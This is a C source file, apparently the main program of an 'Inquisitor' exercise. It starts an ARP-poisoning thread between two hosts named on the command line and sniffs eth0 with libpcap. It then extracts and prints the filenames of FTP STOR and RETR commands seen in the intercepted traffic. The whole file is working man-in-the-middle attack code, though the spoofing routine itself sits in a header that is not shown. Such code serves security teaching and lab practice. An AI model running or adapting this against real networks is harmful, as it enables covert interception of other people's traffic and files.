#include "utils.h"
#include "spoofer.h"
#include "mysignal.h"

static void packet_handler(u_char* user, const struct pcap_pkthdr* h, const u_char* bytes)
{
	state* s = (state*)user;

	int recon = false;

	// // ARP (EtherType 0x0806)
	// if (bytes[12] == 0x08 && bytes[13] == 0x06) { // ARP frame detected
	// 	if (bytes[20] == 0x00 && bytes[21] == 0x01) {
	// 		if (memcmp(bytes + 6, s->source_mac, 6) == 0 || memcmp(bytes + 6, s->target_mac, 6) == 0)
	// 			set_status(DO_NOTHING);
	// 	}
	// }

	if (bytes[12] == 0x08 && bytes[13] == 0x00) { // IPv4 frame detected
		uint8_t ihl = bytes[14] & 0x0F; // Internet Header Length
		uint8_t protocol = bytes[23];   // Protocol field

		if (protocol == 6) { // TCP
			int ip_header_len = ihl * 4;
			int tcp_offset = 14 + ip_header_len;
			uint8_t tcp_header_len = (bytes[tcp_offset + 12] >> 4) * 4;
			int payload_offset = tcp_offset + tcp_header_len;
			int payload_len = h->caplen - payload_offset;
			if (payload_len > 0) {
				// Check if src or dst port is 21 (FTP control)
				uint16_t src_port = (bytes[tcp_offset] << 8) | bytes[tcp_offset + 1];
				uint16_t dst_port = (bytes[tcp_offset + 2] << 8) | bytes[tcp_offset + 3];
				if (src_port == 21 || dst_port == 21) {
					set_status(DO_NOTHING);
					const char* payload = (const char*)(bytes + payload_offset);
					// Look for FTP commands
					if (payload_len > 4 && (strncmp(payload, "STOR ", 5) == 0 || strncmp(payload, "RETR ", 5) == 0)) {
						// Extract filename
						char filename[128] = {0};
						sscanf(payload + 5, "%127s", filename);
						printf("FTP file transfer detected: %s\n\n", filename);
					}
				}
			}
		}
	}
}

void listen_device(char const* name, char** addresses, char* inquisitor_mac)
{
	pcap_t* pcap;
	if (set_pcap(&pcap, name) != 0)
		return;

	state* user;
	if (set_user(&user, addresses, inquisitor_mac) != 0) {
		pcap_close(pcap);
		return ;
	}

	pthread_t	poisoner;
	spoofer_t	spoofer = {user, pcap};
	pthread_create(&poisoner, NULL, spoof, &spoofer);
	pthread_detach(poisoner);

	pcap_loop(pcap, 0, packet_handler, (u_char*) user);
	pcap_close(pcap);
}

int main(int argc, char **argv, char **envp)
{
	setvbuf(stdout, NULL, _IONBF, 0);

	
	if (argc != 5) {
		fprintf(stderr, "Usage: %s <source_ip> <source_mac> <target_ip> <target_mac>\n", argv[0]);
		return 1;
	}
	
	char* inquisitor_mac = find_inquisitor_mac(envp);
	if (inquisitor_mac == NULL) {
		fprintf(stderr, "INQUISITOR_MAC environment variable not set.\n");
		return 1;
	}

	printf("source IP: %s\n", argv[1]);
	printf("source MAC: %s\n", argv[2]);
	printf("target IP: %s\n", argv[3]);
	printf("target MAC: %s\n", argv[4]);
	printf("Inquisitor MAC: %s\n", inquisitor_mac);

	pcap_if_t *alldevsp;
	char error_buffer[PCAP_ERRBUF_SIZE];

	if (pcap_findalldevs(&alldevsp, error_buffer) == -1) {
		printf("Error finding devices: %s\n", error_buffer);
		return 1;
	}

    for (pcap_if_t* d = alldevsp; true; d = d->next) {
		if (d == NULL) {
			printf("Device eth0 not found.\n");
			break;
		}

		if (strcmp(d->name, "eth0") == 0) {
			listen_device(d->name, &argv[1], inquisitor_mac);
			break;
		}
	}

	pcap_freealldevs(alldevsp);
	return 0;
}
